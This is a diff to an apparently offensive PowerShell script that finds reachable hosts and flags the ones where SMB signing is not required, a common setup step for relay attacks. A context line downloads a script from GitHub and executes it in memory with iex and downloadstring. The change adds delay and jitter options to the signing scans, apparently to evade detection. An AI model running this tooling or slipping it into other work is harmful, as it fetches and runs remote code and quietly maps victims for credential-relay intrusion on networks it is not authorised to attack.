@@ -46,7 +46,7 @@ iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/
 # foreach($reachable_host in $reachable_hosts){Invoke-SMBEnum -Target $reachable_host -Action All}
 
 if($reachable_hosts.Count -eq 1) {
-	$smbsigningnotrequired = Get-SMBSigning -Target $reachable_hosts
+	$smbsigningnotrequired = Get-SMBSigning -Delay 4 -DelayJitter 10 -Target $reachable_hosts
 	$smbsigningnotrequired = ($smbsigningnotrequired | Out-String) -split "`n"
 	$smbsigningnotrequired = $smbsigningnotrequired.Trim()
 	$smbsigningnotrequired = $smbsigningnotrequired | Where-Object { $_ -ne "" }
@@ -55,7 +55,7 @@ if($reachable_hosts.Count -eq 1) {
 
 else{
 	$formatted_hosts = '"' + ($reachable_hosts -join '","') + '"'
-	$smbsigningnotrequired = Invoke-Expression "Get-SMBSigning -Targets @($formatted_hosts)" | Select-String "SMB signing is not required"
+	$smbsigningnotrequired = Invoke-Expression "Get-SMBSigning -Delay 4 -DelayJitter 10 -Targets @($formatted_hosts)" | Select-String "SMB signing is not required"
 	$smbsigningnotrequired = ($smbsigningnotrequired | Out-String) -split "`n"
 	$smbsigningnotrequired = $smbsigningnotrequired.Trim()
 	$smbsigningnotrequired = $smbsigningnotrequired | Where-Object { $_ -ne "" }
